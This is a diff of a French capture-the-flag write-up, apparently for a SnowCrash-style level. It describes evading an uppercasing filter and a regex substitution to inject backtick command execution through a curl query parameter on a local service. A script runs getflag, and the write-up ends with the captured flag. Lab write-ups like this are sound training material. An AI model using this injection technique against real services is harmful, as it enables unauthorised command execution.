@@ -6,25 +6,32 @@
 il va falloir bypass les 2 regles de triage, celle qui remplace toute les minuscules par des majuscules, et celle qui va remplacer ce qu'il y a avant par ce qu'il faut (.*@gmail.com va trouver toutes les adresses finissant par @gmail.com) le . representant n'importe quel char, et le * repete l'operation autant de fois que necessaire.
 
 
-la string dans le @output est entre des crochets d'execution, il faut donc remplacer le $XX part ce que je veux
+la string dans le @output est entre des crochets d'execution, il faut donc remplacer le $XX part ce qu'on veut
 
-je cree un fichier GETFLAG pour coder ce script 
+on cree un fichier GETFLAG dans tmp pour coder ce script 
+
+vim /tmp/GETFLAG
+
 #!/bin/bash
 /bin/getflag > /tmp/flag
 
+et on le rend utilisable
+chmod 777 /tmp/GETFLAG
+
 premier test vraiment pas concluant. pour bypass le premier il faut directement tout penser en majuscule, partout dans les ajouts (pas comme apres)
-curl -v 192.168.56.101:4646/x=`/tmp/GETFLAG`
+curl 192.168.56.101:4646/x=`/tmp/GETFLAG`
 
 mais comme ca 
-curl -v localhost:4646/?x=/GETFLAG
+curl localhost:4646/?x=/GETFLAG
 
 le but c'est de faire en sorte qu'il exec notre script
 
 dans la solution ci apres, l'utilisation des quotes permet de limiter et de signifier qu'il s'agit d'un seul element, l'etoile permet quand a elle de faire l'utilisation de wildcard, le programme va chercher partout un quelque chose qui s'appelle GETFLAG, peut importe ou il est
 
-curl -v localhost:4646/?x='`/*/GETFLAG`'
+curl localhost:4646/?x='`/*/GETFLAG`'
 
-pour finir, un cat tmp/flag nous donnera le sesame
+
+pour finir, un cat /tmp/flag nous donnera le sesame
 
 ---
 ## Flag : g1qKMiRpXf53AWhDaU7FEkczr
